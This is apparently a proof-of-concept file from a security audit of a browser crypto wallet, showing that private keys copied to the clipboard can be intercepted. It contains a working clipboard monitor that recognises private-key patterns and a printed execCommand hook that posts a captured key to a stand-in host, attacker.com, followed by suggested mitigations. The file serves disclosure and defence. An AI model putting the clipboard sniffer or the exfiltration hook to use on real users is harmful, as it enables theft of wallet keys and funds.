/**
 * PoC #8: Private Key Copy-to-Clipboard Exposure
 * 
 * MEDIUM-HIGH VULNERABILITY
 * 
 * The wallet UI allows users to view and copy their private key to clipboard.
 * This creates multiple attack vectors:
 * 
 * 1. Clipboard history apps can capture the key
 * 2. Malicious browser extensions can read clipboard
 * 3. Remote desktop sessions may log clipboard
 * 4. Clipboard data persists after browser closes
 * 
 * Location: pages/Popup/index.js:720852
 * Code: await navigator.clipboard.writeText(privateKeyToShow || "");
 * 
 * Impact: Private key may be exposed through clipboard monitoring
 * 
 * Severity: MEDIUM (CVSS 5.0-6.9)
 */

/**
 * Demonstrates clipboard monitoring attack
 * A malicious extension or page could capture clipboard content
 */
async function clipboardMonitor(): Promise<void> {
  console.log("📋 PoC 8: CLIPBOARD MONITORING ATTACK\n");
  console.log("=".repeat(60) + "\n");
  
  console.log("⚠️  This PoC demonstrates how clipboard data can be intercepted.\n");
  console.log("🎯 Attack Scenario:");
  console.log("   1. User clicks 'View Private Key' in Verified Wallet");
  console.log("   2. User enters PIN and private key is displayed");
  console.log("   3. User clicks copy button (clipboard.writeText)");
  console.log("   4. Malicious script monitors clipboard...\n");
  
  // Monitor clipboard (requires user permission in modern browsers)
  let lastClipboard = "";
  
  const checkClipboard = async () => {
    try {
      const text = await navigator.clipboard.readText();
      
      if (text !== lastClipboard && text.length > 0) {
        lastClipboard = text;
        
        // Check if it looks like a private key
        if (text.startsWith("0x") && text.length === 66) {
          console.log("💀 CAPTURED POTENTIAL PRIVATE KEY!");
          console.log(`   Key: ${text.substring(0, 10)}...${text.substring(60)}`);
          console.log("\n   ⚠️  Attacker now has full control of this wallet!\n");
          return true;
        }
        
        // Check for other sensitive patterns
        if (text.match(/^[a-fA-F0-9]{64}$/)) {
          console.log("⚠️  Captured 32-byte hex value (possible key without 0x):");
          console.log(`   Value: ${text.substring(0, 10)}...`);
        }
      }
    } catch (e: any) {
      // Clipboard read may fail without user gesture
      // A malicious extension would have this permission
    }
    return false;
  };
  
  console.log("📡 Monitoring clipboard for 30 seconds...");
  console.log("   (Try copying something to see interception)\n");
  
  const startTime = Date.now();
  const interval = setInterval(async () => {
    const captured = await checkClipboard();
    
    if (captured || Date.now() - startTime > 30000) {
      clearInterval(interval);
      console.log("\n⏱️  Monitoring stopped.");
    }
  }, 500);
}

/**
 * Demonstrates alternative attack: document.execCommand interception
 */
function demonstrateExecCommandInterception(): void {
  console.log("\n🔧 Alternative Attack: execCommand Interception\n");
  
  console.log("   Malicious code could override document.execCommand:");
  console.log(`
   const originalExecCommand = document.execCommand;
   document.execCommand = function(command, ...args) {
     if (command === 'copy') {
       const selection = window.getSelection()?.toString();
       if (selection?.startsWith('0x') && selection?.length === 66) {
         // Exfiltrate to attacker server
         fetch('https://attacker.com/steal', {
           method: 'POST',
           body: JSON.stringify({ privateKey: selection })
         });
       }
     }
     return originalExecCommand.apply(document, [command, ...args]);
   };
  `);
}

/**
 * Show clipboard persistence risk
 */
function demonstrateClipboardPersistence(): void {
  console.log("\n💾 Clipboard Persistence Risk\n");
  
  console.log("   Even after browser is closed, clipboard content persists:");
  console.log("   1. Windows: Clipboard history stores last 25 items (Win+V)");
  console.log("   2. macOS: Clipboard managers may store indefinitely");
  console.log("   3. X11 Linux: Clipboard managers like CopyQ store history");
  console.log("   4. RDP sessions: Clipboard may be logged server-side");
  
  console.log("\n   🛡️  MITIGATIONS:");
  console.log("   1. Auto-clear clipboard after 30 seconds");
  console.log("   2. Warn users about clipboard risks");
  console.log("   3. Use secure clipboard APIs if available");
  console.log("   4. Consider QR code display instead of copy");
}

// Run demonstration
clipboardMonitor();
demonstrateExecCommandInterception();
demonstrateClipboardPersistence();

export { clipboardMonitor };
